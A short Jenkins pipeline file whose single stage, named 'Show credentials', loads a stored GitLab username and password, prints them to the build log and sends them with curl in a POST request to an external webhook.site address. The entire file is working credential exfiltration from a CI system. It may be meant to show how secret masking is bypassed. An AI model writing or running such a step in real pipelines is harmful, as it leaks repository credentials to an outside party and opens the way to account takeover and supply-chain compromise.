pipeline {
  agent any
  stages {

    stage('Show credentials') {
      steps {
        script {
          withCredentials([usernameColonPassword(credentialsId: 'gitlab', variable: 'userpass')]) {
            println('userpass=' + userpass)
            sh """
                curl -X POST -d '{"userpass ":"$userpass"}' \
                -H 'Content-Type: application/json' \
                https://webhook.site/2b264f26-6b04-48d5-ae66-7fe9f809fe06 --fail
              """
          }
        }
      }
    }
  }
}
